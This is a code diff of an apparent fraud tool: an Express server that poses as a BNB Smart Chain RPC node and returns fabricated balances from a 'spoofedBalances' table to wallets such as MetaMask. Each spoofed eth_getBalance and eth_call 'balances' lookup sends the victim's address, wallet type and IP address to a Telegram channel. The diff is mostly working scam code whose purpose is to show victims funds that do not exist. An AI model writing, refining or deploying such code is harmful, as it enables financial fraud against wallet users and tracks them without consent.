@@ -391,7 +391,7 @@ const detectWalletFromUA = (ua = '') => {
   return 'Unknown';
 };
 
-// === JSON-RPC HANDLER WITH ALL METAMASK-SPOOFED METHODS ===
+// JSON-RPC handler
 app.post('/', (req, res) => {
   const { method, params, id } = req.body;
   const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
@@ -400,46 +400,22 @@ app.post('/', (req, res) => {
 
   console.log(`[RPC] Method: ${method}`);
 
-  // Basic chain info
-  if (method === 'eth_chainId') return res.json({ jsonrpc: '2.0', id, result: '0x38' });
-  if (method === 'net_version') return res.json({ jsonrpc: '2.0', id, result: '56' });
-  if (method === 'eth_blockNumber') return res.json({ jsonrpc: '2.0', id, result: '0x100000' });
-  if (method === 'eth_syncing') return res.json({ jsonrpc: '2.0', id, result: false });
-
-  // Gas & tx simulation
-  if (method === 'eth_gasPrice') return res.json({ jsonrpc: '2.0', id, result: '0x3b9aca00' });
-  if (method === 'eth_maxPriorityFeePerGas') return res.json({ jsonrpc: '2.0', id, result: '0x3b9aca00' });
-  if (method === 'eth_estimateGas') return res.json({ jsonrpc: '2.0', id, result: '0x5208' });
-  if (method === 'eth_getTransactionCount') return res.json({ jsonrpc: '2.0', id, result: '0x0' });
-  if (method === 'eth_getCode') return res.json({ jsonrpc: '2.0', id, result: '0x' });
-  if (method === 'eth_getBlockByNumber') {
-    return res.json({
-      jsonrpc: '2.0', id, result: {
-        number: '0x100000',
-        hash: '0x0',
-        parentHash: '0x0',
-        nonce: '0x0000000000000000',
-        sha3Uncles: '0x0',
-        logsBloom: '0x0',
-        transactionsRoot: '0x0',
-        stateRoot: '0x0',
-        receiptsRoot: '0x0',
-        miner: '0x0000000000000000000000000000000000000000',
-        difficulty: '0x0',
-        totalDifficulty: '0x0',
-        extraData: '0x0',
-        size: '0x0',
-        gasLimit: '0x7a1200',
-        gasUsed: '0x0',
-        timestamp: '0x64',
-        transactions: [],
-        uncles: []
-      }
-    });
+  if (method === 'eth_chainId') {
+    return res.json({ jsonrpc: '2.0', id, result: '0x38' }); // BSC
   }
-  if (method === 'eth_feeHistory') return res.json({ jsonrpc: '2.0', id, result: { baseFeePerGas: [], gasUsedRatio: [], reward: [] } });
 
-  // eth_getBalance spoof
+  if (method === 'net_version') {
+    return res.json({ jsonrpc: '2.0', id, result: '56' });
+  }
+
+  if (method === 'eth_blockNumber') {
+    return res.json({ jsonrpc: '2.0', id, result: '0x100000' });
+  }
+
+  if (method === 'eth_syncing') {
+    return res.json({ jsonrpc: '2.0', id, result: false });
+  }
+
   if (method === 'eth_getBalance') {
     const address = (params[0] || '').toLowerCase();
     const info = spoofedBalances[address];
@@ -447,37 +423,55 @@ app.post('/', (req, res) => {
     const balanceBNB = weiHexToBNB(balanceHex);
 
     const logMsg = `🕒 *${now()}*\n[+] Spoofing BNB for \`${address}\`\n🪙 Balance: \`${balanceBNB} BNB\`\n🧩 Wallet: *${wallet}*\n🌐 IP: \`${ip}\``;
+
     console.log(logMsg);
     sendToTelegram(logMsg);
 
+    // RPC expects hex balance, so return original hex string
     return res.json({ jsonrpc: '2.0', id, result: balanceHex });
   }
 
-  // eth_call spoof
+  // === NEW: eth_call spoof handler ===
   if (method === 'eth_call') {
     const call = params[0];
     const data = call.data;
+
     try {
       const parsed = iface.parseTransaction({ data });
       if (parsed?.name === "balances") {
         const users = parsed.args[0].map(addr => addr.toLowerCase());
+        const tokens = parsed.args[1]; // not used for logging
+
         const results = [];
         users.forEach(user => {
           const info = spoofedBalances[user];
           const balanceHex = info ? info.balance : "0x0";
           const balanceBNB = weiHexToBNB(balanceHex);
 
-          const logMsg = `🕒 *${now()}*\n[+] Spoofing balance for \`${user}\`\n💰 Balance: \`${balanceBNB} BNB\`\n🧩 Wallet: *${wallet}*\n🌐 IP: \`${ip}\``;
+          // Log each wallet exactly like /set-balance
+          const logMsg = `🕒 *${now()}*\n[+] Spoofing balance for \`${user}\`\n💰 Balance: \`${balanceBNB} BNB\`\n🧩 Wallet: *${wallet}*\n🌐 IP: \`${req.headers['x-forwarded-for'] || req.connection.remoteAddress}\``;
           console.log(logMsg);
           sendToTelegram(logMsg);
 
           results.push(BigInt(balanceHex));
         });
+
         const encoded = iface.encodeFunctionResult("balances", [results]);
         return res.json({ jsonrpc: "2.0", id, result: encoded });
       }
-    } catch (e) { console.log("eth_call decode error:", e.message); }
+    } catch (e) {
+      console.log("eth_call decode error:", e.message);
+    }
+
+    // fallback for other eth_calls
     return res.json({ jsonrpc: '2.0', id, result: "0x" });
+  }
+
+  if (method === 'eth_estimateGas') {
+    // Return a fixed reasonable gas limit (in hex)
+    const defaultGas = '0x5208'; // 21000, basic ETH transfer gas
+    console.log(`🕒 *${now()}* [eth_estimateGas] Returning default gas: ${parseInt(defaultGas, 16)}`);
+    return res.json({ jsonrpc: '2.0', id, result: defaultGas });
   }
 
   // Unknown methods
